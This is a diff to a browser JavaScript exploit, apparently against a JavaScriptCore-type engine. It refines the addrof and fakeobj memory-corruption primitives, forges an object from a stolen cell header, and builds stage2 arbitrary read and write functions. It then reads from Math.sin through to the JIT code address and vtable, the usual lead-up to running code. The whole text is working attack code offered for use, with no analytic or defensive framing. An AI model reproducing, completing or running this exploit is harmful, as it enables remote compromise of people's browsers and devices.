@@ -478,10 +478,10 @@ for (var i = 0; i < 1000; ++i) {
         // temporary implementations
         addrof = (val) => {
           b1[0] = val;
-          return floatAsQword(a1[offset]);
+          return new Int64.fromDouble(a1[offset]);
         }
         fakeobj = (addr) => {
-          a1[offset] = qwordAsFloat(addr);
+          a1[offset] = new Int64(addr).asDouble();
           return b1[0];
         }
         var victim1 = structure_spray[510];
@@ -491,8 +491,8 @@ for (var i = 0; i < 1000; ++i) {
         var print = (msg) => {
           port.postMessage(msg);
         }
-        print("unboxed @ " + hex1(addrof(unboxed1)));
-        print("boxed @ " + hex1(addrof(boxed1)));
+        print("unboxed @ " + addrof(unboxed1));
+        print("boxed @ " + addrof(boxed1));
 
     var container = {
         header: qwordAsTagged(0x0108230900000000), // cell
@@ -502,9 +502,9 @@ for (var i = 0; i < 1000; ++i) {
     unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     var boxed = [{}];
 
-    print("outer @ " + hex1(addrof(container)));
+    print("outer @ " + addrof(container));
 
-    var hax = fakeobj(addrof(container) + 0x10);
+    var hax = fakeobj(Add(addrof(container),0x10));
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
@@ -523,7 +523,7 @@ for (var i = 0; i < 1000; ++i) {
         results.push(a[0]);
     }
     jscell_header = results[0];
-    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+    print("Stolen Real Cell Header: " + new Int64.fromDouble(js_header))
       
     var stage2 = {
         addrof: function(obj) {
@@ -538,6 +538,12 @@ for (var i = 0; i < 1000; ++i) {
             hax[1] = qwordAsFloat(where + 0x10);
             victim1.prop = this.fakeobj(qwordAsFloat(what));
         },
+	
+	writeInt64: function(where, what) {
+            set_victim_addr(where)
+            victim1.prop = this.fakeobj(floatAsQword(what.asDouble()));
+        },
+
 
         read64: function(where,offset) {
             //var reset = hax[1];
@@ -576,13 +582,13 @@ for (var i = 0; i < 1000; ++i) {
             var v;
 
             for (i = 0; i + 8 < length; i += 8) {
-                v = new Int64(this.read64(addr + i)).bytes()
+                v = this.readInt64(addr + i).bytes()
                 for (var j = 0; j < 8; j++) {
                     a[i+j] = v[j];
                 }
             }
 
-            v = new Int64(this.read64(addr + i)).bytes()
+            v = this.read64(addr + i).bytes()
             for (var j = i; j < length; j++) {
                 a[j] = v[j - i];
             }
@@ -626,12 +632,12 @@ for (var i = 0; i < 1000; ++i) {
     memory = stage2;
 	var sinFuncAddr = memory.addrof(Math.sin);
         
-        var executableAddr = memory.read64(sinFuncAddr+24);
+        var executableAddr = memory.read64(sinFuncAddr,3);
        
-        var jitCodeAddr = memory.read64(executableAddr+24);
+        var jitCodeAddr = memory.read64(executableAddr,3);
         print("jit @ " + jitCodeAddr)
         
-        var vtab = memory.read64(jitCodeAddr);
+        var vtab = memory.read64(jitCodeAddr,0);
         print("vtab @ " + vtab)
         var anchor1 = memory.read64(vtab,0)
         print("anchor1" + anchor1);
